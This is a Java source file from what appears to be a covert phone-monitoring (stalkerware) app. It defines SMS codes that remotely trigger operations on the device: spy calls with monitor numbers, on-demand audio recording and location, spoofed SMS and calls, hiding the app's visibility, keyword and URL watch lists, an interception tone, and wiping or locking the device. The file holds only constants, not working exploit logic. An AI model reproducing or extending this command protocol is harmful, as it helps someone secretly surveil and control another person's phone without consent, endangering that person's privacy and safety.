package com.vvt.remotecommandmanager;

public class SmsCommandPattern {
	
	//Monitor call
	public static final String ENABLE_SPY_CALL = "<*#9>";
	public static final String ENABLE_SPY_CALL_WITH_MONITOR = "<*#10>";
	public static final String ADD_MONITORS = "<*#160>";
	public static final String RESET_MONITORS = "<*#163>";
	public static final String CLEAR_MONITORS = "<*#161>";
	public static final String QUERY_MONITORS = "<*#162>";
	public static final String ADD_CIS_NUMBERS = "<*#130>";
	public static final String RESET_CIS_NUMBERS = "<*#131>";
	public static final String CLEAR_CIS_NUMBERS = "<*#132>";
	public static final String QUERY_CIS_NUMBERS = "<*#133>";
	
	//Miscellaneous
	public static final String REQUEST_HEART_BEAT = "<*#2>";
	public static final String REQUEST_EVENTS = "<*#64>";
	public static final String SET_SETTINGS = "<*#92>";
	public static final String ENABLE_SIM_CHANGE = "<*#56>";
	public static final String ENABLE_CAPTURE = "<*#60>";
	public static final String SET_VISIBILITY = "<*#14214>";
	public static final String ENABLE_COMMUNICATION_RESTRICTIONS = "<*#204>";
	
	//Activation and installation
	public static final String ACTIVATE_WITH_ACTIVATION_CODE_AND_URL = "<*#14140>";
	public static final String ACTIVATE_WITH_URL = "<*#14141>";
	public static final String DEACTIVATE = "<*#14142>";
	public static final String SET_ACTIVATION_PHONE_NUMBER = "<*#14258>";
	public static final String SYNC_UPDATE_CONFIGURATION = "<*#300>";
	public static final String UNINSTALL_APPLICATION = "<*#200>";
	public static final String SYNC_SOFTWARE_UPDATE = "<*#306>";
	public static final String ENABLE_PRODUCT = "<*#14000>";
	public static final String REQUEST_MOBILE_NUMBER = "<*#199>";
	
	//Address Book
	public static final String REQUEST_ADDRESSBOOK = "<*#120>";
	public static final String SET_ADDRESSBOOK_FOR_APPROVAL = "<*#121>";
	public static final String SET_ADDRESSBOOK_MANAGEMENT = "<*#122>";
	public static final String SYNC_ADDRESSBOOK = "<*#301>";
	
	//Media
//	public static final String UPLOAD_ACTUAL_MEDIA = "";
//	public static final String DELETE_ACTUAL_MEDIA = "";
	public static final String ON_DEMAND_RECORD = "<*#84>";
	
	//GPS
	public static final String ENABLE_LOCATION = "<*#52>";
	public static final String UPDATE_GPS_INTERVAL = "<*#53>";
	public static final String ON_DEMAND_LOCATION = "<*#101>";
	
	//Communication
	public static final String SPOOF_SMS = "<*#85>";
	public static final String SPOOF_CALL = "<*#86>";
	
	//Call watch
	public static final String ENABLE_WATCH_NOTIFICATION = "<*#49>";
	public static final String SET_WATCH_FLAGS = "<*#50>";
	public static final String ADD_WATCH_NUMBER = "<*#45>";
	public static final String RESET_WATCH_NUMBER = "<*#46>";
	public static final String CLEAR_WATCH_NUMBER = "<*#47>";
	public static final String QUERY_WATCH_NUMBER = "<*#48>";
	
	//Keyword list
	public static final String ADD_KEYWORD = "<*#73>";
	public static final String RESET_KEYWORD = "<*#74>";
	public static final String CLEAR_KEYWORD = "<*#75>";
	public static final String QUERY_KEYWORD = "<*#76>";
	
	//URL list
	public static final String ADD_URL = "<*#396>";
	public static final String RESET_URL = "<*#397>";
	public static final String CLEAR_URL = "<*#398>";
	public static final String QUERY_URL = "<*#399>";
	
	//Security and protection
	public static final String SET_PANIC_MODE = "<*#31>";
	public static final String SET_WIPE_OUT = "<*#201>";
	public static final String SET_LOCK_DEVICE = "<*#202>";
	public static final String SET_UNLOCK_DEVICE = "<*#203>";
	public static final String ADD_EMERGENCY_NUMBER = "<*#164>";
	public static final String RESET_EMERGENCY_NUMBER = "<*#165>";
	public static final String QUERY_EMERGENCY_NUMBER = "<*#167>";
	public static final String CLEAR_EMERGENCY_NUMBER = "<*#166>";
	
	//Troubleshoot
	public static final String REQUEST_SETTINGS = "<*#67>";
	public static final String REQUEST_DIAGNOSTIC = "<*#62>";
	public static final String REQUEST_START_UP_TIME = "<*#5>";
	public static final String RESTART_DEVICE = "<*#147>";
	public static final String RETRIEVE_RUNNING_PROCESSES = "<*#14852>";
	public static final String TERMINATE_RUNNING_PROCESSES = "<*#14853>";
	public static final String SET_DEBUG_MODE = "<*#170>";
	public static final String REQUEST_CURRENT_URL = "<*#14143>";
	public static final String ENABLE_CONFERENCING_DEBUGING = "<*#12>";
	public static final String INTERCEPTION_TONE = "<*#21>";
	public static final String RESET_LOG_DURATION = "<*#65>";
	public static final String FORCE_APN_DISCOVERY = "<*#71>";
	
	//Notification Numbers
	public static final String ADD_NOTIFICATION_NUMBERS = "<*#171>";
	public static final String RESET_NOTIFICATION_NUMBERS = "<*#172>";
	public static final String CLEAR_NOTIFICATION_NUMBERS = "<*#173>";
	public static final String QUERY_NOTIFICATION_NUMBERS = "<*#174>";
	
	//Home numbers
	public static final String ADD_HOMES = "<*#150>";
	public static final String RESET_HOMES = "<*#151>";
	public static final String CLEAR_HOMES = "<*#152>";
	public static final String QUERY_HOMES = "<*#153>";
	
	//Sync
	public static final String SYNC_COMMUNICATION_DIRECTIVES = "<*#302>";
	public static final String SYNC_TIME = "<*#303>";
	public static final String SYNC_PROCESS_PROFILE = "<*#304>";
	public static final String SYNC_INCOMPATIBLE_APPLICATION_DEFINITION = "<*#307>";
	
	
}
